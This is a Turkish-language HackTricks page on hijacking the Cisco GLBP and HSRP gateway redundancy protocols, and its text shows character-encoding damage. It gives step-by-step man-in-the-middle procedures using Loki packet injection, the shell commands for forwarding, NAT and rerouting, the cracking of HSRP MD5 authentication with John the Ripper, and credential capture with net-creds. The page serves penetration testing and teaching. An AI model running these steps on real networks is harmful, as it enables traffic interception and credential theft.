# GLBP & HSRP SaldÄ±rÄ±larÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>


## FHRP Hijacking Genel BakÄ±ÅŸ

### FHRP HakkÄ±nda Bilgiler
FHRP, birden fazla yÃ¶nlendiriciyi tek bir sanal birimde birleÅŸtirerek aÄŸÄ±n saÄŸlamlÄ±ÄŸÄ±nÄ± saÄŸlamak iÃ§in tasarlanmÄ±ÅŸtÄ±r, bÃ¶ylece yÃ¼k daÄŸÄ±tÄ±mÄ±nÄ± ve hata tolere edebilirliÄŸi artÄ±rÄ±r. Cisco Systems, bu pakette GLBP ve HSRP gibi Ã¶nde gelen protokoller tanÄ±ttÄ±.

### GLBP ProtokolÃ¼ HakkÄ±nda Bilgiler
Cisco'nun yaratÄ±mÄ± olan GLBP, TCP/IP yÄ±ÄŸÄ±nÄ±nda Ã§alÄ±ÅŸÄ±r ve iletiÅŸim iÃ§in UDP'yi 3222 numaralÄ± baÄŸlantÄ± noktasÄ±nda kullanÄ±r. GLBP grubundaki yÃ¶nlendiriciler, 3 saniye aralÄ±klarla "hello" paketleri alÄ±ÅŸveriÅŸi yapar. Bir yÃ¶nlendirici bu paketleri 10 saniye boyunca gÃ¶ndermezse, Ã§evrimdÄ±ÅŸÄ± olduÄŸu varsayÄ±lÄ±r. Bununla birlikte, bu zamanlayÄ±cÄ±lar sabit deÄŸildir ve deÄŸiÅŸtirilebilir.

### GLBP Ä°ÅŸlemleri ve YÃ¼k DaÄŸÄ±tÄ±mÄ±
GLBP, tek bir sanal IP ile birden fazla sanal MAC adresi kullanarak yÃ¶nlendiriciler arasÄ±nda yÃ¼k daÄŸÄ±tÄ±mÄ±nÄ± saÄŸlayarak Ã¶ne Ã§Ä±kar. Bir GLBP grubunda, her yÃ¶nlendirici paket iletimine dahil olur. HSRP/VRRP'nin aksine, GLBP birkaÃ§ mekanizma aracÄ±lÄ±ÄŸÄ±yla gerÃ§ek yÃ¼k dengelemesi sunar:

- **Ana Bilgisayara BaÄŸÄ±mlÄ± YÃ¼k Dengelemesi:** Bir ana bilgisayara sÃ¼rekli AVF MAC adresi atamasÄ±nÄ± saÄŸlar, istikrarlÄ± NAT yapÄ±landÄ±rmalarÄ± iÃ§in Ã¶nemlidir.
- **Round-Robin YÃ¼k Dengelemesi:** VarsayÄ±lan yaklaÅŸÄ±m, isteyen ana bilgisayarlara yÃ¶nelik AVF MAC adresi atamasÄ±nÄ± sÄ±rayla yapar.
- **AÄŸÄ±rlÄ±klÄ± Round-Robin YÃ¼k Dengelemesi:** Ã–nceden belirlenmiÅŸ "AÄŸÄ±rlÄ±k" metriklerine dayanarak yÃ¼kÃ¼ daÄŸÄ±tÄ±r.

### GLBP'deki Ana BileÅŸenler ve Terimler
- **AVG (Aktif Sanal AÄŸ GeÃ§idi):** MAC adreslerini eÅŸ yÃ¶nlendiricilere atama sorumluluÄŸu olan ana yÃ¶nlendirici.
- **AVF (Aktif Sanal Ä°letici):** AÄŸ trafiÄŸini yÃ¶netmek iÃ§in belirlenen bir yÃ¶nlendirici.
- **GLBP Ã–nceliÄŸi:** AVG'yi belirleyen bir metrik, varsayÄ±lan olarak 100'den baÅŸlar ve 1 ile 255 arasÄ±nda deÄŸiÅŸir.
- **GLBP AÄŸÄ±rlÄ±ÄŸÄ±:** Bir yÃ¶nlendiricideki mevcut yÃ¼kÃ¼ yansÄ±tÄ±r, manuel olarak veya Nesne Ä°zleme aracÄ±lÄ±ÄŸÄ±yla ayarlanabilir.
- **GLBP Sanal IP Adresi:** BaÄŸlÄ± tÃ¼m cihazlar iÃ§in aÄŸÄ±n varsayÄ±lan aÄŸ geÃ§idi olarak hizmet verir.

GLBP, etkileÅŸimler iÃ§in ayrÄ±lmÄ±ÅŸ Ã§oklu yayÄ±n adresi 224.0.0.102 ve UDP baÄŸlantÄ± noktasÄ± 3222'yi kullanÄ±r. YÃ¶nlendiriciler "hello" paketlerini 3 saniye aralÄ±klarla ileterek, bir paket 10 saniye boyunca kaÃ§Ä±rÄ±lÄ±rsa iÅŸlevsiz kabul edilir.

### GLBP SaldÄ±rÄ± MekanizmasÄ±
Bir saldÄ±rgan, GLBP paketi gÃ¶ndererek en yÃ¼ksek Ã¶ncelik deÄŸeri (255) ile birincil yÃ¶nlendirici olabilir. Bu, trafik yakalama veya yÃ¶nlendirme izni veren DoS veya MITM saldÄ±rÄ±larÄ±na yol aÃ§abilir.

### Loki ile GLBP SaldÄ±rÄ±sÄ± GerÃ§ekleÅŸtirme
[Loki](https://github.com/raizo62/loki_on_kali), Ã¶ncelik ve aÄŸÄ±rlÄ±k deÄŸeri 255 olarak ayarlanmÄ±ÅŸ bir paket enjekte ederek bir GLBP saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilir. SaldÄ±rÄ± Ã¶ncesi adÄ±mlar, Wireshark gibi araÃ§lar kullanarak sanal IP adresi, kimlik doÄŸrulama varlÄ±ÄŸÄ± ve yÃ¶nlendirici Ã¶ncelik deÄŸerleri gibi bilgileri toplamayÄ± iÃ§erir.

SaldÄ±rÄ± AdÄ±mlarÄ±:
1. PromiskÃ¼s moduna geÃ§in ve IP yÃ¶nlendirmeyi etkinleÅŸtirin.
2. Hedef yÃ¶nlendiriciyi belirleyin ve IP'sini alÄ±n.
3. Bir Gratuitous ARP oluÅŸturun.
4. AVG'yi taklit eden kÃ¶tÃ¼ niyetli bir GLBP paketi enjekte edin.
5. SaldÄ±rganÄ±n aÄŸ arayÃ¼zÃ¼ne GLBP sanal IP'sini yansÄ±tan ikincil bir IP adresi atayÄ±n.
6. Tam trafik gÃ¶rÃ¼nÃ¼rlÃ¼ÄŸÃ¼ iÃ§in SNAT uygulayÄ±n.
7. Ä°nternet eriÅŸimini orijinal AVG yÃ¶nlendiricisi Ã¼zerinden devam ettirmek iÃ§in yÃ¶nlendirmeyi ayarlayÄ±n.

Bu adÄ±mlarÄ± takip ederek, saldÄ±rgan kendisini aÄŸ trafiÄŸini, ÅŸifrelenmemiÅŸ veya hassas verileri de iÃ§eren bir "orta adam" olarak konumlandÄ±rÄ±r ve analiz edebilir.

Demonstrasyon iÃ§in gereken komut parÃ§alarÄ± aÅŸaÄŸÄ±da verilmiÅŸtir:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### HSRP Hijacking ile Ä°lgili Pasif AÃ§Ä±klama ve Komut DetaylarÄ±

#### HSRP'nin Genel BakÄ±ÅŸÄ± (Hot Standby Router/Redundancy Protocol)
HSRP, aÄŸ geÃ§idi yedekliliÄŸi iÃ§in tasarlanmÄ±ÅŸ Cisco'ya ait bir protokoldÃ¼r. Birden fazla fiziksel yÃ¶nlendiriciyi paylaÅŸÄ±lan bir IP adresine sahip tek bir mantÄ±ksal birim olarak yapÄ±landÄ±rmayÄ± saÄŸlar. Bu mantÄ±ksal birim, trafiÄŸi yÃ¶nlendiren birincil bir yÃ¶nlendirici tarafÄ±ndan yÃ¶netilir. YÃ¼k dengelemesi iÃ§in Ã¶ncelik ve aÄŸÄ±rlÄ±k gibi metrikler kullanan GLBP'nin aksine, HSRP trafiÄŸi yÃ¶netmek iÃ§in tek bir etkin yÃ¶nlendiriciye dayanÄ±r.

#### HSRP'deki Roller ve Terimler
- **HSRP Etkin YÃ¶nlendirici**: Trafik akÄ±ÅŸÄ±nÄ± yÃ¶neten aÄŸ geÃ§idi olarak hareket eden cihaz.
- **HSRP Bekleme YÃ¶nlendirici**: Etkin yÃ¶nlendirici baÅŸarÄ±sÄ±z olduÄŸunda devralmaya hazÄ±r olan yedek yÃ¶nlendirici.
- **HSRP Grubu**: Tek bir dayanÄ±klÄ± sanal yÃ¶nlendirici oluÅŸturmak iÃ§in iÅŸbirliÄŸi yapan yÃ¶nlendiricilerin bir kÃ¼mesi.
- **HSRP MAC Adresi**: HSRP yapÄ±landÄ±rmasÄ±ndaki mantÄ±ksal yÃ¶nlendiriciye atanan sanal MAC adresi.
- **HSRP Sanal IP Adresi**: HSRP grubunun sanal IP adresi, baÄŸlÄ± cihazlar iÃ§in varsayÄ±lan aÄŸ geÃ§idi olarak hareket eder.

#### HSRP SÃ¼rÃ¼mleri
HSRP iki sÃ¼rÃ¼mde gelir, HSRPv1 ve HSRPv2, grup kapasitesi, Ã§oklu yayÄ±n IP kullanÄ±mÄ± ve sanal MAC adresi yapÄ±sÄ± gibi farklÄ±lÄ±klar gÃ¶sterir. Protokol, hizmet bilgileri alÄ±ÅŸveriÅŸi iÃ§in belirli Ã§oklu yayÄ±n IP adreslerini kullanÄ±r ve Hello paketleri her 3 saniyede bir gÃ¶nderilir. Bir yÃ¶nlendiriciye 10 saniye iÃ§inde hiÃ§ paket alÄ±nmazsa etkin olmadÄ±ÄŸÄ± varsayÄ±lÄ±r.

#### HSRP SaldÄ±rÄ± MekanizmasÄ±
HSRP saldÄ±rÄ±larÄ±, en yÃ¼ksek Ã¶ncelik deÄŸerini enjekte ederek Etkin YÃ¶nlendirici'nin rolÃ¼nÃ¼ zorla ele geÃ§irmeyi iÃ§erir. Bu, Man-In-The-Middle (MITM) saldÄ±rÄ±sÄ±na yol aÃ§abilir. Ã–n saldÄ±rÄ± adÄ±mlarÄ± arasÄ±nda HSRP yapÄ±landÄ±rmasÄ± hakkÄ±nda veri toplamak yer alÄ±r ve bunu trafik analizi iÃ§in Wireshark kullanarak yapabilirsiniz.

#### HSRP Kimlik DoÄŸrulamasÄ±nÄ± GeÃ§me AdÄ±mlarÄ±
1. HSRP verilerini iÃ§eren aÄŸ trafiÄŸini .pcap dosyasÄ± olarak kaydedin.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. hsrp2john.py kullanarak .pcap dosyasÄ±ndan MD5 karma deÄŸerlerini Ã§Ä±karÄ±n.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper kullanarak MD5 karma deÄŸerlerini kÄ±rÄ±n.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki ile HSRP Enjeksiyonu GerÃ§ekleÅŸtirme**

1. HSRP reklamlarÄ±nÄ± tanÄ±mlamak iÃ§in Loki'yi baÅŸlatÄ±n.
2. AÄŸ arayÃ¼zÃ¼nÃ¼ promiscuous moduna ve IP yÃ¶nlendirmeyi etkinleÅŸtirin.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Loki'yi kullanarak belirli yÃ¶nlendiriciyi hedefleyin, kÄ±rÄ±lmÄ±ÅŸ HSRP ÅŸifresini girin ve Etkin YÃ¶nlendirici'yi taklit etmek iÃ§in gerekli yapÄ±landÄ±rmalarÄ± yapÄ±n.
4. Etkin YÃ¶nlendirici rolÃ¼nÃ¼ aldÄ±ktan sonra, aÄŸ arayÃ¼zÃ¼nÃ¼ ve IP tablolarÄ±nÄ±zÄ± meÅŸru trafiÄŸi yakalamak iÃ§in yapÄ±landÄ±rÄ±n.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Trafik yÃ¶nlendirmesini eski Etkin YÃ¶nlendirici Ã¼zerinden yÃ¶nlendirmek iÃ§in yÃ¶nlendirme tablosunu deÄŸiÅŸtirin.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Yakalanan trafiÄŸe net-creds.py veya benzer bir araÃ§ kullanarak kimlik bilgilerini yakalayÄ±n.
```shell
sudo python2 net-creds.py -i eth0
```

Bu adÄ±mlarÄ± uygulamak, GLBP ele geÃ§irme iÅŸlemi iÃ§in yapÄ±lan iÅŸlemlere benzer ÅŸekilde saldÄ±rganÄ± trafiÄŸi yakalamak ve manipÃ¼le etmek iÃ§in bir konuma yerleÅŸtirir. Bu, HSRP gibi yedeklilik protokollerindeki zayÄ±flÄ±ÄŸÄ± ve saÄŸlam gÃ¼venlik Ã¶nlemlerine olan ihtiyacÄ± vurgular.


## Kaynaklar
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin.
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
